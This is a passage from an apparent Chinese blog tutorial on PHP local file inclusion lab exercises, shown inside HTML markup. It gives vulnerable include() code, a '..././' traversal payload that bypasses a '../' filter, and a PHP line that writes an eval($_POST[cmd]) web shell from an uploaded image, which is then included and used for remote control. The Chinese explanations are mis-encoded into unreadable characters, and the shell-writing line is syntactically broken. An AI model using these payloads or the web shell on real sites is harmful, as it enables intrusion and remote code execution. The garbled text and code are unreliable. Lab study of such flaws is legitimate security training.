double-quoted-string\">\"pages/<span class=\"token interpolation\"><span class=\"token variable\">$file</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n   <span class=\"token keyword\">else</span>\n   <span class=\"token punctuation\">{<!-- --></span>\n       <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>é€šè¿‡æºç å¯ä»¥çœ‹åˆ°ï¼Œä»–æŠŠ<code>../</code>æ›¿æ¢æˆäº†ç©ºï¼Œè¿™ä¸€å¥ï¼š<code>$file = str_replace('../', '', $_GET['file']);</code><br/> ç»•è¿‡æ€è·¯ï¼šåœ¨ä¸¤ä¸ªç‚¹ä¹‹é—´åŠ <code>../</code><br/> <code>?file=..././..././..././..././phpinfo.php</code></p>\n<h2><a id=\"6methodPOST_186\"></a>ğŸ6ã€methodä¸ºPOST</h2> &lt;?php include(\"../common/header.php\"); ?&gt; \n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> from https<span class=\"token punctuation\">:</span><span class=\"token comment\">//pentesterlab.com/exercises/php_include_and_post_exploitation/course --&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token function\">hint</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"will include the arg specified in the POST parameter \\\"page\\\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/LFI-6/index.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"POST\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"page\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"page\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>åªä¸è¿‡æ˜¯æäº¤æ–¹å¼æ–¹ä¾¿ï¼Œç»•è¿‡æ€è·¯åŒGETã€‚<br/> ç»•è¿‡æ€è·¯ï¼šä¸Šä¼ ç‚¹å¦‚æœä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œ</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\b08bb6a5b8594e81a66426e99370d64f.png\"/><br/> å†…å®¹ä¸ºå¦‚ä¸‹ï¼Œå½“æˆ‘ä»¬æ–‡ä»¶åŒ…å«<code>tupian.jpg</code>çš„æ—¶å€™ï¼Œä¼šåœ¨åŒä¸€ç›®å½•ä¸‹ï¼ˆè¿™é‡Œçš„ç›®å½•æ˜¯å½“å‰æ ¹ç›®å½•ï¼‰ç”Ÿæˆä¸€ä¸ª<code>shell.php</code>çš„æ–‡ä»¶ï¼Œå†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬<code>&lt;?php eval($_POST[cmd])?&gt;</code></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shell.php'</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>æ–‡ä»¶åŒ…å«ï¼š<br/> <code>ï¼Ÿpage=../../../../tupian.jpg</code><br/> ç„¶åèœåˆ€è¿æ¥ã€‚</p>\n<h2><a id=\"7_215\"></a>ğŸ7ã€åŒ…å«æ—¥å¿—æ–‡ä»¶</h2>\n<h1><a id=\"_216\"></a>ğŸŒ»ä¸‰ã€å¾…è¡¥å……</h1>\n<p>ä½ æœ‰ä»€ä¹ˆè¡¥å……è¯´æ˜çš„ï¼Œæ¬¢è¿è¯„è®ºåŒºç•™è¨€è®¨è®ºï¼</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}